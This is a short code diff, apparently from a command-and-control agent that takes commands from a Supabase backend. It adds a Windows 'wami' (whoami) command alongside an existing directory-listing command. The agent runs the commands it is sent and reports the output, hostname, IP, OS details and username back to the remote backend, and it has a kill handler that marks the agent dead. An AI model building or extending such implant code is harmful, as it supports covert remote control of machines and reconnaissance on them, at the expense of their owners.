@@ -8,7 +8,7 @@ from .config import SUPABASE_KEY
 
 # Conditional import based on the operating system
 if os.name == 'nt':  # 'nt' indicates Windows
-    from .winAPI import wls  # Import the wls function
+    from .winAPI import wls, wami  # Import the wls and whoami functions
 
 def handle_kill_command(command_id, command_text, hostname, supabase: Client):
     """Handles the kill command, updates the command status to 'Completed', marks the agent as 'Dead', and exits."""
@@ -82,6 +82,17 @@ def execute_commands(supabase: Client):
                 try:
                     path = command_text.split(' ', 1)[1]  # Expecting command to be in format "wls [path]"
                     result = wls(path)
+                    status = 'Completed'
+                    output = "\n".join(result)
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+
+            # Handle 'wami' command only if on Windows
+            elif os.name == 'nt' and command_text.lower() == 'wami':
+                try:
+                    result = wami()
                     status = 'Completed'
                     output = "\n".join(result)
                 except Exception as e:
